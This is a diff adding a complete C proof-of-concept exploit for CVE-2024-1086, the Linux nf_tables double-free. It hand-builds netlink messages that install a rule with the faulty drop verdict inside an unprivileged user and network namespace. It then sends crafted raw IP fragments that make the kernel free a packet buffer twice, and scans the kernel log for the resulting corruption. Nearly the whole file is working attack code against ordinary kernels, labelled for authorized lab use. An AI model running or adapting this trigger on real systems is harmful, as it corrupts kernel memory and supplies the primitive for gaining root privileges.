@@ -1,0 +1,616 @@
+/*
+ * nftables.c - CVE-2024-1086 nf_tables use-after-free / double-free PoC.
+ *
+ * Vendored single-file implementation of the public exploit technique
+ * researched and published by Notselwyn (github.com/Notselwyn/CVE-2024-1086).
+ * No external libraries are required (plain `cc nftables.c -o nftables`).
+ *
+ * What this PoC does, step by step:
+ *   1. unshare(CLONE_NEWUSER|CLONE_NEWNET) so an unprivileged user gains
+ *      CAP_NET_ADMIN over a fresh network namespace (the classic unpriv
+ *      nftables reachability requirement).
+ *   2. Installs an nftables base chain at PRE_ROUTING containing the buggy
+ *      immediate verdict expression (verdict code 0xFFFF0000 = NF_DROP with a
+ *      *positive* drop error, the root cause of CVE-2024-1086). The netlink
+ *      nfnetlink batch is hand-built - no libmnl/libnftnl dependency.
+ *   3. Sends the crafted fragmented raw-IP packet dance (ipfrag_time
+ *      juggling + matching fragment) that makes the kernel free the same skb
+ *      twice inside the fragment reassembly queue.
+ *   4. Observes the kernel log (/dev/kmsg with a dmesg fallback) for the
+ *      resulting memory-corruption evidence (BUG/double free/GPF lines).
+ *
+ * The full privilege-escalation chain (PTE spray -> modprobe_path overwrite,
+ * or skb reclaim via pipe_buffer) used by the reference exploit is documented
+ * in the payload WhitePaper; this PoC proves and detects the vulnerability
+ * primitive with minimal kernel risk and no external dependencies.
+ *
+ * Authorized security-lab use only.
+ *
+ * Build: cc nftables.c -o nftables
+ * Run:   ./nftables          (as an unprivileged user on a vulnerable kernel)
+ * Exit:  0 trigger completed, 1 setup failed. Evidence is printed as
+ *        "[+]" / "[-]" markers that the deploy.py launcher parses.
+ */
+#define _GNU_SOURCE
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#include <linux/netfilter.h>
+#include <linux/netfilter/nf_tables.h>
+#include <linux/netfilter/nfnetlink.h>
+#include <linux/netlink.h>
+
+#ifndef NFNL_SUBSYS_NFTABLES
+#define NFNL_SUBSYS_NFTABLES 10
+#endif
+
+#define TABLE_NAME "qclifilter"
+#define CHAIN_NAME "df"
+#define PAYLOAD_FRAG_SIZE (32768 + 8)
+#define COMPLETION_OFF (PAYLOAD_FRAG_SIZE >> 3)
+
+/* ------------------------------------------------------------------ */
+/* tiny netlink attribute builder                                       */
+/* ------------------------------------------------------------------ */
+
+struct msgbuf {
+    unsigned char data[16384];
+    size_t len;
+};
+
+static void buf_reset(struct msgbuf *b) { b->len = 0; }
+
+static void buf_u8(struct msgbuf *b, unsigned char v) { b->data[b->len++] = v; }
+
+static void buf_u16(struct msgbuf *b, uint16_t v)
+{
+    memcpy(b->data + b->len, &v, sizeof(v));
+    b->len += sizeof(v);
+}
+
+static void buf_u32(struct msgbuf *b, uint32_t v)
+{
+    memcpy(b->data + b->len, &v, sizeof(v));
+    b->len += sizeof(v);
+}
+
+static void buf_bytes(struct msgbuf *b, const void *p, size_t n)
+{
+    memcpy(b->data + b->len, p, n);
+    b->len += n;
+}
+
+static void buf_pad4(struct msgbuf *b)
+{
+    while (b->len & 3)
+        buf_u8(b, 0);
+}
+
+static size_t attr_hdr(struct msgbuf *b, uint16_t type)
+{
+    size_t pos = b->len;
+    buf_u16(b, 0); /* patched in attr_finish */
+    buf_u16(b, type);
+    return pos;
+}
+
+static void attr_finish(struct msgbuf *b, size_t pos)
+{
+    uint16_t len = (uint16_t)(b->len - pos);
+    memcpy(b->data + pos, &len, sizeof(len));
+}
+
+/* netfilter netlink u32 attributes are big-endian on the wire */
+static void attr_u32be(struct msgbuf *b, uint16_t type, uint32_t v)
+{
+    size_t pos = attr_hdr(b, type);
+    buf_u32(b, htonl(v));
+    attr_finish(b, pos);
+}
+
+static void attr_bytes(struct msgbuf *b, uint16_t type, const void *p, size_t n)
+{
+    size_t pos = attr_hdr(b, type);
+    buf_bytes(b, p, n);
+    buf_pad4(b);
+    attr_finish(b, pos);
+}
+
+static void attr_str(struct msgbuf *b, uint16_t type, const char *s)
+{
+    attr_bytes(b, type, s, strlen(s) + 1);
+}
+
+static size_t attr_nest(struct msgbuf *b, uint16_t type)
+{
+    return attr_hdr(b, (uint16_t)(type | NLA_F_NESTED));
+}
+
+static size_t nlmsg_hdr(struct msgbuf *b, uint16_t type, uint16_t flags, uint32_t seq)
+{
+    size_t pos = b->len;
+    buf_u32(b, 0); /* nlmsg_len, patched in nlmsg_finish */
+    buf_u16(b, type);
+    buf_u16(b, flags);
+    buf_u32(b, seq);
+    buf_u32(b, 0); /* nlmsg_pid */
+    return pos;
+}
+
+static void nlmsg_finish(struct msgbuf *b, size_t pos)
+{
+    uint32_t len = (uint32_t)(b->len - pos);
+    memcpy(b->data + pos, &len, sizeof(len));
+    buf_pad4(b); /* keep following nlmsghdrs aligned */
+}
+
+static void nfgenmsg(struct msgbuf *b, uint8_t family, uint16_t res_id)
+{
+    buf_u8(b, family);
+    buf_u8(b, 0); /* NFNETLINK_V0 */
+    buf_u16(b, res_id);
+}
+
+/* ------------------------------------------------------------------ */
+/* nftables batch construction                                          */
+/* ------------------------------------------------------------------ */
+
+static void msg_batch_begin(struct msgbuf *b, uint32_t *seq)
+{
+    size_t pos = nlmsg_hdr(b, (uint16_t)(NFNL_MSG_BATCH_BEGIN), NLM_F_REQUEST, (*seq)++);
+    nfgenmsg(b, 0, htons(NFNL_SUBSYS_NFTABLES));
+    nlmsg_finish(b, pos);
+}
+
+static void msg_batch_end(struct msgbuf *b, uint32_t *seq)
+{
+    size_t pos = nlmsg_hdr(b, (uint16_t)(NFNL_MSG_BATCH_END), NLM_F_REQUEST, (*seq)++);
+    nfgenmsg(b, 0, htons(NFNL_SUBSYS_NFTABLES));
+    nlmsg_finish(b, pos);
+}
+
+static void msg_newtable(struct msgbuf *b, uint32_t *seq)
+{
+    size_t pos = nlmsg_hdr(b, (uint16_t)((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE),
+                           (uint16_t)(NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE), (*seq)++);
+    nfgenmsg(b, 2 /* NFPROTO_IPV4 */, 0);
+    attr_str(b, NFTA_TABLE_NAME, TABLE_NAME);
+    nlmsg_finish(b, pos);
+}
+
+static void msg_newchain(struct msgbuf *b, uint32_t *seq)
+{
+    size_t pos = nlmsg_hdr(b, (uint16_t)((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN),
+                           (uint16_t)(NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE), (*seq)++);
+    size_t hook;
+    nfgenmsg(b, 2, 0);
+    attr_str(b, NFTA_CHAIN_TABLE, TABLE_NAME);
+    attr_str(b, NFTA_CHAIN_NAME, CHAIN_NAME);
+    hook = attr_nest(b, NFTA_CHAIN_HOOK);
+    attr_u32be(b, NFTA_HOOK_HOOKNUM, 0);  /* NF_INET_PRE_ROUTING */
+    attr_u32be(b, NFTA_HOOK_PRIORITY, 0); /* filter priority */
+    attr_finish(b, hook);
+    attr_str(b, NFTA_CHAIN_TYPE, "filter");
+    nlmsg_finish(b, pos);
+}
+
+static void expr_payload(struct msgbuf *b, uint32_t offset, uint32_t len)
+{
+    size_t e = attr_nest(b, NFTA_LIST_ELEM);
+    size_t d;
+    attr_str(b, NFTA_EXPR_NAME, "payload");
+    d = attr_nest(b, NFTA_EXPR_DATA);
+    attr_u32be(b, NFTA_PAYLOAD_DREG, 1); /* NFT_REG_1 */
+    attr_u32be(b, NFTA_PAYLOAD_BASE, 1);  /* NFT_PAYLOAD_NETWORK_HEADER */
+    attr_u32be(b, NFTA_PAYLOAD_OFFSET, offset);
+    attr_u32be(b, NFTA_PAYLOAD_LEN, len);
+    attr_finish(b, d);
+    attr_finish(b, e);
+}
+
+static void expr_cmp(struct msgbuf *b, const void *data, uint32_t len)
+{
+    size_t e = attr_nest(b, NFTA_LIST_ELEM);
+    size_t d;
+    size_t dv;
+    attr_str(b, NFTA_EXPR_NAME, "cmp");
+    d = attr_nest(b, NFTA_EXPR_DATA);
+    attr_u32be(b, NFTA_CMP_SREG, 1); /* NFT_REG_1 */
+    attr_u32be(b, NFTA_CMP_OP, 0);   /* NFT_CMP_EQ */
+    dv = attr_nest(b, NFTA_CMP_DATA);
+    attr_bytes(b, NFTA_DATA_VALUE, data, len);
+    attr_finish(b, dv);
+    attr_finish(b, d);
+    attr_finish(b, e);
+}
+
+static void expr_immediate_verdict(struct msgbuf *b, uint32_t code)
+{
+    size_t e = attr_nest(b, NFTA_LIST_ELEM);
+    size_t d;
+    size_t dat;
+    size_t ver;
+    attr_str(b, NFTA_EXPR_NAME, "immediate");
+    d = attr_nest(b, NFTA_EXPR_DATA);
+    attr_u32be(b, NFTA_IMMEDIATE_DREG, 0); /* NFT_REG_VERDICT */
+    dat = attr_nest(b, NFTA_IMMEDIATE_DATA);
+    ver = attr_nest(b, NFTA_DATA_VERDICT);
+    attr_u32be(b, NFTA_VERDICT_CODE, code);
+    attr_finish(b, ver);
+    attr_finish(b, dat);
+    attr_finish(b, d);
+    attr_finish(b, e);
+}
+
+static void msg_newrule(struct msgbuf *b, uint32_t *seq)
+{
+    size_t pos = nlmsg_hdr(b, (uint16_t)((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE),
+                           (uint16_t)(NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND), (*seq)++);
+    size_t exprs;
+    unsigned char proto70 = 70;
+    nfgenmsg(b, 2, 0);
+    attr_str(b, NFTA_RULE_TABLE, TABLE_NAME);
+    attr_str(b, NFTA_RULE_CHAIN, CHAIN_NAME);
+    exprs = attr_nest(b, NFTA_RULE_EXPRESSIONS);
+    /* match: ip protocol == 70 */
+    expr_payload(b, 9, 1); /* offsetof(struct iphdr, protocol) */
+    expr_cmp(b, &proto70, 1);
+    /* match: first 4 payload bytes == "AAAA" */
+    expr_payload(b, 20, 4); /* sizeof(struct iphdr) */
+    expr_cmp(b, "AAAA", 4);
+    /* action: immediate verdict code 0xFFFF0000 (NF_DROP | positive drop
+     * error == 1 aka NF_ACCEPT) - the CVE-2024-1086 root cause */
+    expr_immediate_verdict(b, 0xFFFF0000u);
+    attr_finish(b, exprs);
+    nlmsg_finish(b, pos);
+}
+
+static int nl_send_and_await_ack(struct msgbuf *b)
+{
+    struct sockaddr_nl addr;
+    unsigned char rbuf[8192];
+    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+    struct timeval tv = {2, 0};
+    int ret = 0;
+    ssize_t n;
+
+    if (sock < 0) {
+        perror("socket(NETLINK_NETFILTER)");
+        return -1;
+    }
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    memset(&addr, 0, sizeof(addr));
+    addr.nl_family = AF_NETLINK;
+    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+        perror("bind(nl)");
+        close(sock);
+        return -1;
+    }
+    memset(&addr, 0, sizeof(addr));
+    addr.nl_family = AF_NETLINK;
+    addr.nl_pid = 0; /* kernel */
+    if (sendto(sock, b->data, b->len, 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        perror("sendto(nl)");
+        close(sock);
+        return -1;
+    }
+    /* drain ACK/ERROR responses */
+    for (;;) {
+        struct nlmsghdr *nh;
+        n = recv(sock, rbuf, sizeof(rbuf), 0);
+        if (n <= 0)
+            break;
+        nh = (struct nlmsghdr *)rbuf;
+        for (; NLMSG_OK(nh, (unsigned int)n); nh = NLMSG_NEXT(nh, n)) {
+            if (nh->nlmsg_type == NLMSG_ERROR) {
+                struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(nh);
+                if (err->error != 0) {
+                    fprintf(stderr, "[-] netlink error %d (%s)\n", err->error, strerror(-err->error));
+                    ret = -1;
+                }
+            }
+        }
+    }
+    close(sock);
+    return ret;
+}
+
+static int configure_nftables(void)
+{
+    struct msgbuf batch;
+    uint32_t seq = 1;
+
+    buf_reset(&batch);
+    msg_batch_begin(&batch, &seq);
+    msg_newtable(&batch, &seq);
+    msg_newchain(&batch, &seq);
+    msg_newrule(&batch, &seq);
+    msg_batch_end(&batch, &seq);
+
+    return nl_send_and_await_ack(&batch);
+}
+
+/* ------------------------------------------------------------------ */
+/* sandbox                                                              */
+/* ------------------------------------------------------------------ */
+
+static void write_proc(const char *path, const char *data, size_t len)
+{
+    int fd = open(path, O_WRONLY);
+    if (fd < 0) {
+        fprintf(stderr, "[-] open %s: %s\n", path, strerror(errno));
+        exit(1);
+    }
+    if (write(fd, data, len) != (ssize_t)len) {
+        fprintf(stderr, "[-] write %s: %s\n", path, strerror(errno));
+        close(fd);
+        exit(1);
+    }
+    close(fd);
+}
+
+static void setup_sandbox(void)
+{
+    char map[64];
+    uid_t uid = getuid();
+    gid_t gid = getgid();
+    int s;
+    struct ifreq ifr;
+
+    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
+        perror("unshare(CLONE_NEWUSER|CLONE_NEWNET)");
+        exit(1);
+    }
+    snprintf(map, sizeof(map), "0 %d 1\n", (int)uid);
+    write_proc("/proc/self/setgroups", "deny", 5);
+    write_proc("/proc/self/uid_map", map, strlen(map));
+    snprintf(map, sizeof(map), "0 %d 1\n", (int)gid);
+    write_proc("/proc/self/gid_map", map, strlen(map));
+
+    s = socket(AF_INET, SOCK_DGRAM, 0);
+    if (s >= 0) {
+        memset(&ifr, 0, sizeof(ifr));
+        strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
+        ifr.ifr_flags = IFF_UP;
+        ioctl(s, SIOCSIFFLAGS, &ifr);
+        close(s);
+    }
+    write_proc("/proc/sys/net/ipv4/conf/lo/rp_filter", "0\n", 2);
+    write_proc("/proc/sys/net/ipv4/conf/all/rp_filter", "0\n", 2);
+    printf("[+] sandbox ready (user+net namespace, lo up, rp_filter off)\n");
+}
+
+/* ------------------------------------------------------------------ */
+/* raw fragmented IP packet dance                                       */
+/* ------------------------------------------------------------------ */
+
+static int raw_sock = -1;
+
+static void open_raw(void)
+{
+    int one = 1;
+    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (raw_sock < 0) {
+        perror("socket(SOCK_RAW)");
+        exit(1);
+    }
+    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) != 0) {
+        perror("setsockopt(IP_HDRINCL)");
+        exit(1);
+    }
+}
+
+static void send_ip_frag(uint16_t id, uint16_t ip_off_flags, const char *payload, size_t plen)
+{
+    static char buf[70000];
+    struct ip *h = (struct ip *)buf;
+    struct sockaddr_in dst;
+
+    memset(buf, 0, sizeof(struct ip));
+    h->ip_v = 4;
+    h->ip_hl = 5;
+    h->ip_tos = 0;
+    h->ip_len = htons((uint16_t)(sizeof(struct ip) + plen));
+    h->ip_id = id; /* caller passes network order */
+    h->ip_off = ip_off_flags;
+    h->ip_ttl = 128;
+    h->ip_p = 70; /* the protocol our rule matches */
+    h->ip_src.s_addr = inet_addr("127.0.0.1");
+    h->ip_dst.s_addr = inet_addr("127.0.0.1");
+    if (plen)
+        memcpy(buf + sizeof(struct ip), payload, plen);
+
+    memset(&dst, 0, sizeof(dst));
+    dst.sin_family = AF_INET;
+    dst.sin_addr.s_addr = inet_addr("127.0.0.1");
+    if (sendto(raw_sock, buf, sizeof(struct ip) + plen, 0,
+              (struct sockaddr *)&dst, sizeof(dst)) < 0)
+        perror("sendto(raw)");
+}
+
+/* reserve/drain skbs through a local UDP socket pair, mirroring the
+ * reference exploit's skb-freelist shaping at a modest scale */
+static void skb_spray_drain(int count)
+{
+    int rx = socket(AF_INET, SOCK_DGRAM, 0);
+    int tx = socket(AF_INET, SOCK_DGRAM, 0);
+    struct sockaddr_in bind_addr, dst;
+    char one = 'Q';
+    char tmp[64];
+    int i;
+    struct timeval tv = {0, 200000};
+
+    if (rx < 0 || tx < 0)
+        return;
+    memset(&bind_addr, 0, sizeof(bind_addr));
+    bind_addr.sin_family = AF_INET;
+    bind_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    bind_addr.sin_port = htons(31337);
+    if (bind(rx, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) != 0) {
+        close(rx);
+        close(tx);
+        return;
+    }
+    memset(&dst, 0, sizeof(dst));
+    dst.sin_family = AF_INET;
+    dst.sin_addr.s_addr = inet_addr("127.0.0.1");
+    dst.sin_port = htons(31337);
+    setsockopt(rx, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+
+    for (i = 0; i < count; i++)
+        sendto(tx, &one, 1, 0, (struct sockaddr *)&dst, sizeof(dst));
+    for (i = 0; i < count; i++)
+        (void)recv(rx, tmp, sizeof(tmp), 0);
+    close(rx);
+    close(tx);
+}
+
+static void trigger_double_free(void)
+{
+    static char zeros[PAYLOAD_FRAG_SIZE];
+    static char aaaa[PAYLOAD_FRAG_SIZE];
+
+    memset(zeros, 0, sizeof(zeros));
+    memset(aaaa, 'A', sizeof(aaaa));
+
+    /* 1. intermediate fragment expires under ipfrag_time=1 (queue shaping) */
+    write_proc("/proc/sys/net/ipv4/ipfrag_time", "1\n", 2);
+    send_ip_frag(htons(0x1336), htons(0x2000 | 1), zeros, PAYLOAD_FRAG_SIZE);
+    write_proc("/proc/sys/net/ipv4/ipfrag_time", "9999\n", 5);
+    sleep(3);
+
+    /* 2. skb spray/drain to shape the skb freelist */
+    skb_spray_drain(64);
+
+    /* 3. the matching fragment: dropped by the buggy verdict (freed once)
+     *    while remaining queued for reassembly */
+    printf("[*] sending double free buffer packet...\n");
+    send_ip_frag(htons(0x1337), htons(0x2000), aaaa, PAYLOAD_FRAG_SIZE);
+
+    skb_spray_drain(64);
+
+    /* 4. completion fragment (end == offset trick) processes the queue and
+     *    frees the already-freed skb a second time */
+    send_ip_frag(htons(0x1337), htons((uint16_t)(0x2000 | COMPLETION_OFF)), NULL, 0);
+    printf("[+] double free triggered\n");
+}
+
+/* ------------------------------------------------------------------ */
+/* kernel log evidence collection                                       */
+/* ------------------------------------------------------------------ */
+
+static int kmsg_fd = -1;
+
+static void kmsg_open(void)
+{
+    kmsg_fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
+    if (kmsg_fd >= 0)
+        (void)lseek(kmsg_fd, 0, SEEK_END); /* skip history */
+}
+
+static int kmsg_scan(void)
+{
+    char line[2048];
+    int found = 0;
+    ssize_t n;
+    static const char *needles[] = {
+        "BUG:", "double free", "general protection",
+        "nf_tables", "nft_immediate", "freed object",
+    };
+    size_t i;
+
+    if (kmsg_fd < 0)
+        return -1; /* no access */
+    for (;;) {
+        n = read(kmsg_fd, line, sizeof(line) - 1);
+        if (n <= 0)
+            break;
+        line[n] = 0;
+        /* strip the syslog prefix up to ';' */
+        for (i = 0; i < (size_t)n; i++) {
+            if (line[i] == ';') {
+                memmove(line, line + i + 1, (size_t)n - i);
+                break;
+            }
+        }
+        for (i = 0; i < sizeof(needles) / sizeof(needles[0]); i++) {
+            if (strstr(line, needles[i]) != NULL) {
+                printf("[+] kernel log evidence: %s", line);
+                found = 1;
+                break;
+            }
+        }
+    }
+    return found;
+}
+
+static int dmesg_scan(void)
+{
+    FILE *fp = popen("dmesg 2>/dev/null", "r");
+    char line[2048];
+    int found = 0;
+    static const char *needles[] = {
+        "BUG:", "double free", "general protection", "freed object",
+    };
+    size_t i;
+
+    if (fp == NULL)
+        return -1;
+    while (fgets(line, sizeof(line), fp) != NULL) {
+        for (i = 0; i < sizeof(needles) / sizeof(needles[0]); i++) {
+            if (strstr(line, needles[i]) != NULL) {
+                printf("[+] kernel log evidence (dmesg): %s", line);
+                found = 1;
+                break;
+            }
+        }
+    }
+    pclose(fp);
+    return found;
+}
+
+int main(void)
+{
+    int evidence;
+
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (geteuid() == 0)
+        printf("[*] note: running as root; sandbox still applies\n");
+
+    setup_sandbox();
+    kmsg_open();
+    open_raw();
+
+    if (configure_nftables() != 0) {
+        printf("[-] failed to install nftables rule (patched kernel or no NETLINK_NETFILTER?)\n");
+        return 1;
+    }
+    printf("[+] nftables rule installed (table %s, chain %s, buggy verdict 0xFFFF0000)\n",
+           TABLE_NAME, CHAIN_NAME);
+
+    trigger_double_free();
+
+    evidence = kmsg_scan();
+    if (evidence < 0)
+        evidence = dmesg_scan();
+    if (evidence > 0)
+        printf("[+] CVE-2024-1086 primitive CONFIRMED via kernel log\n");
+    else if (evidence == 0)
+        printf("[-] no kernel log evidence; trigger completed without visible splat\n");
+    else
+        printf("[*] no kernel log access; trigger completed (verify via dmesg)\n");
+    return 0;
+}
